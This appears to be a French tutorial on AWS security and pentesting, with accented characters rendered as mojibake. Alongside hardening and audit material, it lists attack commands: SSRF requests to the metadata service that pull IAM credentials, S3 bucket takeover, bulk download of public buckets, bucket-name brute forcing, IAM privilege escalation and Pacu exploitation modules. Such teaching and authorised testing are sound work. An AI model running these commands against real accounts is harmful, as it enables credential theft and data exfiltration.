# S√©curit√© et Pentest AWS

## ‚òÅÔ∏è Vue d'ensemble

**Amazon Web Services (AWS)** est le leader mondial du cloud computing. Comprendre sa s√©curit√© est crucial car de plus en plus d'entreprises migrent leurs infrastructures vers AWS.

> **üí° Analogie Simple** : AWS c'est comme une ville g√©ante avec diff√©rents quartiers (r√©gions), b√¢timents (services), et syst√®mes de s√©curit√© (IAM) - il faut comprendre l'urbanisme pour naviguer efficacement.

## ‚ö†Ô∏è **IMPORTANT - Cadre L√©gal et √âthique**

> **üéØ CE GUIDE EST UNIQUEMENT √Ä DES FINS √âDUCATIVES !**

### üìù Usage Autoris√© vs Interdit :

**‚úÖ AUTORIS√â :**
```
‚Ä¢ Tests sur VOS propres comptes AWS
‚Ä¢ Environnements de lab d√©di√©s
‚Ä¢ Pentests autoris√©s par le client
‚Ä¢ Formations et certifications
‚Ä¢ Bug bounty programs autoris√©s
```

**‚ùå STRICTEMENT INTERDIT :**
```
‚Ä¢ Tests sur comptes AWS non autoris√©s
‚Ä¢ Scan d'infrastructures tierces
‚Ä¢ DDoS ou attaques de d√©ni de service
‚Ä¢ Tentatives d'acc√®s non autoris√©es
‚Ä¢ Violation des ToS AWS
```

## üéØ Objectifs d'apprentissage

Apr√®s cette section, vous saurez :
1. **Architecture AWS** - Comprendre les services et r√©gions
2. **IAM Security** - Gestion des identit√©s et acc√®s
3. **Services vuln√©rables** - S3, EC2, Lambda et autres
4. **Reconnaissance cloud** - D√©couvrir l'exposition
5. **Exploitation pratique** - Techniques d'attaque r√©elles

## üèóÔ∏è Architecture AWS Fondamentale

### **Mod√®le de responsabilit√© partag√©e**

#### **Responsabilit√© d'AWS (S√©curit√© DU cloud)**
```
AWS EST RESPONSABLE DE :
‚Ä¢ Infrastructure physique des data centers
‚Ä¢ Hyperviseur et couche de virtualisation
‚Ä¢ Syst√®mes d'exploitation h√¥tes
‚Ä¢ Services manag√©s (RDS, Lambda, etc.)
‚Ä¢ R√©seau global et connectivit√©
‚Ä¢ Conformit√© physique et environnementale
```

#### **Responsabilit√© du client (S√©curit√© DANS le cloud)**
```
LE CLIENT EST RESPONSABLE DE :
‚Ä¢ Configuration des services AWS
‚Ä¢ Gestion des identit√©s et acc√®s (IAM)
‚Ä¢ Syst√®me d'exploitation des instances EC2
‚Ä¢ Applications et donn√©es
‚Ä¢ Chiffrement des donn√©es
‚Ä¢ Configuration r√©seau (VPC, Security Groups)
```

### **R√©gions et Availability Zones**

#### **Structure g√©ographique**
```
HI√âRARCHIE AWS :
‚Ä¢ R√©gion (ex: eu-west-1) 
  ‚îú‚îÄ‚îÄ Availability Zone A (eu-west-1a)
  ‚îú‚îÄ‚îÄ Availability Zone B (eu-west-1b) 
  ‚îî‚îÄ‚îÄ Availability Zone C (eu-west-1c)

IMPLICATIONS S√âCURIT√â :
‚Ä¢ Data residency (localisation des donn√©es)
‚Ä¢ Latence et performance
‚Ä¢ Compliance r√©glementaire
‚Ä¢ Co√ªts de transfert inter-r√©gions
```

## üîê AWS IAM (Identity and Access Management)

### **Composants IAM essentiels**

#### **Users (Utilisateurs)**
```json
{
  "Users": [
    {
      "UserName": "alice-dev",
      "UserId": "AIDACKCEVSQ6C2EXAMPLE",
      "Path": "/",
      "CreateDate": "2024-01-15T09:30:00Z",
      "PasswordLastUsed": "2024-01-20T14:22:00Z"
    }
  ]
}
```

#### **Groups (Groupes)**
```json
{
  "Groups": [
    {
      "GroupName": "Developers",
      "Path": "/",
      "GroupId": "AGPAI23HZ27SI6FQMGNQ2",
      "CreateDate": "2024-01-10T10:00:00Z"
    }
  ]
}
```

#### **Roles (R√¥les)**
```json
{
  "Roles": [
    {
      "RoleName": "EC2-S3-Access-Role",
      "Path": "/",
      "RoleId": "AROACKCEVSQ6C2EXAMPLE",
      "AssumeRolePolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
          {
            "Effect": "Allow",
            "Principal": {
              "Service": "ec2.amazonaws.com"
            },
            "Action": "sts:AssumeRole"
          }
        ]
      }
    }
  ]
}
```

### **Politiques IAM (Policies)**

#### **Structure d'une politique**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowS3ReadAccess",
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::mon-bucket-exemple/*",
        "arn:aws:s3:::mon-bucket-exemple"
      ],
      "Condition": {
        "StringEquals": {
          "aws:RequestedRegion": "eu-west-1"
        }
      }
    }
  ]
}
```

#### **Politiques dangereuses communes**
```json
// ATTENTION : Politique trop permissive !
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}

// Politique avec wildcards dangereux
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:*",
        "iam:*",
        "ec2:*"
      ],
      "Resource": "*"
    }
  ]
}
```

## üöÄ Services AWS Critiques pour la S√©curit√©

### **Amazon S3 (Simple Storage Service)**

#### **Buckets S3 et s√©curit√©**
```bash
# Structure d'URL S3
https://bucket-name.s3.amazonaws.com/
https://bucket-name.s3.region.amazonaws.com/
https://s3.amazonaws.com/bucket-name/

# Buckets publics accidentels
https://bucket-entreprise-backup.s3.amazonaws.com/
https://company-data-dump.s3.eu-west-1.amazonaws.com/
```

#### **Configurations dangereuses S3**
```json
// Bucket policy trop ouverte
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "PublicReadGetObject",
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::bucket-public-exemple/*"
    }
  ]
}

// ACL dangereuse
{
  "Grants": [
    {
      "Grantee": {
        "Type": "Group",
        "URI": "http://acs.amazonaws.com/groups/global/AllUsers"
      },
      "Permission": "READ"
    }
  ]
}
```

### **Amazon EC2 (Elastic Compute Cloud)**

#### **Security Groups (Firewalls)**
```json
// Security Group trop permissif
{
  "IpPermissions": [
    {
      "IpProtocol": "-1",
      "IpRanges": [
        {
          "CidrIp": "0.0.0.0/0",
          "Description": "Allow all traffic - DANGEREUX !"
        }
      ]
    }
  ]
}

// SSH ouvert au monde entier
{
  "IpProtocol": "tcp",
  "FromPort": 22,
  "ToPort": 22,
  "IpRanges": [
    {
      "CidrIp": "0.0.0.0/0"
    }
  ]
}
```

#### **Instance Metadata Service (IMDS)**
```bash
# IMDS v1 (vuln√©rable √† SSRF)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role

# IMDS v2 (plus s√©curis√©)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

### **AWS Lambda**

#### **Variables d'environnement sensibles**
```json
// Variables d'environnement expos√©es
{
  "Environment": {
    "Variables": {
      "DB_PASSWORD": "super-secret-password",
      "API_KEY": "sk-1234567890abcdef",
      "JWT_SECRET": "my-jwt-secret-key"
    }
  }
}
```

#### **Permissions Lambda dangereuses**
```json
// R√¥le Lambda trop permissif
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:*",
        "dynamodb:*",
        "lambda:*"
      ],
      "Resource": "*"
    }
  ]
}
```

## üîç Reconnaissance AWS

### **D√©couverte de buckets S3**

#### **Techniques de d√©couverte**
```bash
# Brute force de noms de buckets
aws s3 ls s3://company-name-backup --no-sign-request
aws s3 ls s3://company-data --no-sign-request
aws s3 ls s3://company-logs --no-sign-request

# Dictionnaires pour bucket fuzzing
company-backup
company-data
company-logs
company-dev
company-prod
company-staging
company-db-backup
company-website-backup
```

#### **Outils automatis√©s**
```bash
# S3Scanner
python3 s3scanner.py -l bucket_names.txt

# AWSBucketDump
python AWSBucketDump.py -l bucket_list.txt

# s3-bucket-finder
./s3-bucket-finder.rb -w wordlist.txt
```

### **√ânum√©ration des services expos√©s**

#### **Reconnaissance passive**
```bash
# Certificats SSL/TLS pour d√©couvrir sous-domaines
curl -s "https://crt.sh/?q=%.company.com&output=json" | jq -r '.[].name_value' | sort -u

# Recherche dans les DNS
dig company.com ANY
dig _amazonses.company.com TXT

# Google dorking pour AWS
site:s3.amazonaws.com "company"
site:*.amazonaws.com "company"
```

#### **Reconnaissance active**
```bash
# Nmap pour services AWS expos√©s
nmap -sS -p 80,443,8080,8443 company-elb-123456.eu-west-1.elb.amazonaws.com

# D√©tection d'ELB/ALB
curl -I https://company-app.com/
# Rechercher headers : X-Amzn-Trace-Id, X-Amz-Cf-Id
```

## üéØ Techniques d'Exploitation

### **Escalade de privil√®ges IAM**

#### **Politiques attach√©es dangereuses**
```bash
# V√©rifier ses propres permissions
aws iam get-user
aws iam list-attached-user-policies --user-name alice
aws iam list-user-policies --user-name alice

# √ânum√©ration des groupes
aws iam get-groups-for-user --user-name alice
aws iam get-group --group-name Developers

# Exploration des r√¥les assumables
aws iam list-roles
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/PowerUserRole --role-session-name test-session
```

#### **Actions privil√©gi√©es exploitables**
```json
// Si vous avez iam:AttachUserPolicy
{
  "AttachUserPolicy": {
    "UserName": "alice",
    "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
  }
}

// Si vous avez iam:CreateRole + iam:AttachRolePolicy
{
  "CreateRole": {
    "RoleName": "PrivEscRole",
    "AssumeRolePolicyDocument": "..."
  }
}
```

### **Exploitation S3**

#### **Bucket takeover**
```bash
# D√©couvrir buckets avec erreur "NoSuchBucket"
curl -s https://company-old-app.s3.amazonaws.com/
# Erreur : NoSuchBucket

# Cr√©er le bucket manquant
aws s3 mb s3://company-old-app --region us-east-1
echo "Bucket compromis !" > index.html
aws s3 cp index.html s3://company-old-app/
```

#### **Exfiltration de donn√©es S3**
```bash
# Lister le contenu
aws s3 ls s3://bucket-public-exemple/ --recursive --no-sign-request

# T√©l√©charger des fichiers sensibles
aws s3 cp s3://bucket-public-exemple/users.sql . --no-sign-request
aws s3 cp s3://bucket-public-exemple/backup/ . --recursive --no-sign-request

# Synchronisation compl√®te
aws s3 sync s3://bucket-public-exemple/ ./local-copy/ --no-sign-request
```

### **Exploitation EC2 et IMDS**

#### **SSRF vers IMDS**
```bash
# Via une application web vuln√©rable
curl "http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/"

# R√©cup√©ration des credentials temporaires
curl "http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl "http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-S3-Role"

# R√©ponse type :
{
  "Code" : "Success",
  "LastUpdated" : "2024-01-20T14:22:33Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "AKIAIOSFODNN7EXAMPLE",
  "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token" : "TokenStringExample",
  "Expiration" : "2024-01-20T20:22:33Z"
}
```

## üõ†Ô∏è Outils AWS Security

### **AWS CLI et profils**
```bash
# Configuration de profils multiples
aws configure --profile company-dev
aws configure --profile company-prod

# Utilisation des profils
aws s3 ls --profile company-dev
aws iam list-users --profile company-prod

# Variables d'environnement
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
export AWS_DEFAULT_REGION=eu-west-1
```

### **ScoutSuite (Audit automatis√©)**
```bash
# Installation
pip3 install scoutsuite

# Audit complet AWS
scout aws --profile company-prod

# Audit sp√©cifique de services
scout aws --services s3,iam --profile company-dev

# G√©n√©ration de rapport HTML
# R√©sultats dans : ./scoutsuite-report/
```

### **Prowler (Compliance checker)**
```bash
# Installation
git clone https://github.com/prowler-cloud/prowler
cd prowler

# Audit de s√©curit√© complet
./prowler aws

# Groupes de checks sp√©cifiques
./prowler aws -g cis_level1
./prowler aws -g gdpr
./prowler aws -g hipaa

# Check sp√©cifique
./prowler aws -c check21  # S3 buckets publics
```

### **Pacu (Framework d'exploitation AWS)**
```bash
# Installation
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu
pip3 install -r requirements.txt

# D√©marrage
python3 pacu.py

# Modules d'√©num√©ration
run iam__enum_permissions
run s3__bucket_finder
run ec2__enum

# Modules d'exploitation
run iam__privesc_scan
run s3__download_bucket
```

## üõ°Ô∏è D√©fense et Hardening AWS

### **IAM Hardening**

#### **Principes de s√©curit√©**
```json
// Politique avec principe du moindre privil√®ge
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObject"
      ],
      "Resource": "arn:aws:s3:::specific-bucket/specific-folder/*",
      "Condition": {
        "StringEquals": {
          "aws:RequestedRegion": "eu-west-1"
        },
        "DateGreaterThan": {
          "aws:CurrentTime": "2024-01-01T00:00:00Z"
        }
      }
    }
  ]
}
```

#### **MFA et conditions**
```json
// Forcer MFA pour actions sensibles
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Deny",
      "Action": "*",
      "Resource": "*",
      "Condition": {
        "BoolIfExists": {
          "aws:MultiFactorAuthPresent": "false"
        }
      }
    }
  ]
}
```

### **S3 Security Best Practices**

#### **Bucket policy s√©curis√©e**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyInsecureConnections",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": [
        "arn:aws:s3:::secure-bucket",
        "arn:aws:s3:::secure-bucket/*"
      ],
      "Condition": {
        "Bool": {
          "aws:SecureTransport": "false"
        }
      }
    }
  ]
}
```

### **Monitoring et alertes**

#### **CloudTrail pour l'audit**
```json
// Event CloudTrail suspicious
{
  "eventTime": "2024-01-20T14:22:33Z",
  "eventName": "AssumeRole",
  "eventSource": "sts.amazonaws.com",
  "sourceIPAddress": "suspicious-ip.com",
  "userAgent": "aws-cli/2.0.0",
  "errorCode": "AccessDenied"
}
```

## üìã Checklist Pentest AWS

### **Phase reconnaissance**
```bash
‚òê D√©couverte de buckets S3 publics
‚òê √ânum√©ration des sous-domaines AWS
‚òê Identification des services expos√©s
‚òê Recherche de certificats SSL
‚òê Collecte d'informations publiques
‚òê Analyse des erreurs d'application
‚òê Recherche de fuites de credentials
‚òê Mapping de l'infrastructure cloud
```

### **Phase √©num√©ration**
```bash
‚òê Test d'acc√®s aux buckets S3
‚òê √ânum√©ration des permissions IAM
‚òê V√©rification des Security Groups
‚òê Test des Instance Metadata Service
‚òê Recherche de Lambda functions expos√©es
‚òê V√©rification des bases de donn√©es RDS
‚òê Test des APIs Gateway
‚òê √ânum√©ration des CloudFront distributions
```

### **Phase exploitation**
```bash
‚òê Escalade de privil√®ges IAM
‚òê Exploitation SSRF vers IMDS
‚òê Takeover de buckets S3
‚òê Exfiltration de donn√©es
‚òê Persistence via backdoors
‚òê Mouvement lat√©ral entre services
‚òê Exploitation de misconfiguration
‚òê Contournement des restrictions
```

## üéØ Ressources et R√©f√©rences

### **Documentation officielle**
- **AWS Security Hub** : https://aws.amazon.com/security-hub/
- **AWS Well-Architected Security** : https://aws.amazon.com/architecture/well-architected/
- **AWS IAM Best Practices** : https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html

### **Outils de s√©curit√©**
- **ScoutSuite** : https://github.com/nccgroup/ScoutSuite
- **Prowler** : https://github.com/prowler-cloud/prowler
- **Pacu** : https://github.com/RhinoSecurityLabs/pacu
- **CloudMapper** : https://github.com/duo-labs/cloudmapper

### **Training et labs**
- **AWS Security Labs** : https://awssecworkshops.com/
- **CloudGoat** : https://github.com/RhinoSecurityLabs/cloudgoat
- **Sadcloud** : https://github.com/nccgroup/sadcloud
- **DVCA** : https://github.com/m6a-UdS/dvca

---
*AWS security is shared responsibility - understand your part and secure it properly !* 